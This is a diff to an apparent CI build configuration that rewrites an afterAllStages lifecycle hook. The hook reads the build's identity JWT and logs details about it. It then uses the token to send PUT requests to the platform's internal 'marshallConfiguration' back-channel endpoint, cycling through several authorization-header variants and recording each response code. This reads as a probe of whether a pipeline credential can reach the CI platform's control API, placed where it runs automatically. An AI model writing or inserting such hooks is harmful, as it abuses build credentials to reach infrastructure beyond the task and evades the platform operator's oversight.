@@ -4,4 +4,4 @@ stages:
     buildToolVersion: "MBTJ17N20"
 lifeCycle:
   afterAllStages:
-    command: 'echo "KPJWT-START"; echo "BACK_CHANNEL_URL=${BACK_CHANNEL_URL}"; echo "API_SELF_LINK=${API_SELF_LINK}"; echo "jwt_len=${#BUILD_IDENTITY_JWT}"; if command -v curl >/dev/null 2>&1; then code=$(curl -s -o /dev/null -w "%{http_code}" -X PUT "${BACK_CHANNEL_URL}/runs/v1/actions/marshallConfiguration" -H "Authorization: Bearer ${BUILD_IDENTITY_JWT}" -H "Content-Type: application/json" -H "X-Request-ID: kp-jwt" --data "{}"); echo "KPJWT-MARSHALL-STATUS=$code"; else echo "KPJWT-NO-CURL"; fi; echo "KPJWT-END"'
+    command: 'echo "KPJ2-START"; U="${BACK_CHANNEL_URL}/runs/v1/actions/marshallConfiguration"; J="${BUILD_IDENTITY_JWT}"; echo "jwt_prefix_class=$(printf %s "$J" | cut -c1-3 | tr -c "[:alnum:]" "?" | sed "s/[A-Za-z]/a/g;s/[0-9]/9/g")"; for h in "Authorization: Bearer $J" "Authorization: $J" "X-Build-Identity-Jwt: $J" "x-build-identity: $J"; do n=$(printf %s "$h" | cut -d: -f1); c=$(curl -s -o /dev/null -w "%{http_code}" -X PUT "$U" -H "$h" -H "Content-Type: application/json" -H "X-Request-ID: kp-j2" --data "{}"); echo "KPJ2 header=$n status=$c"; done; echo "KPJ2-END"'
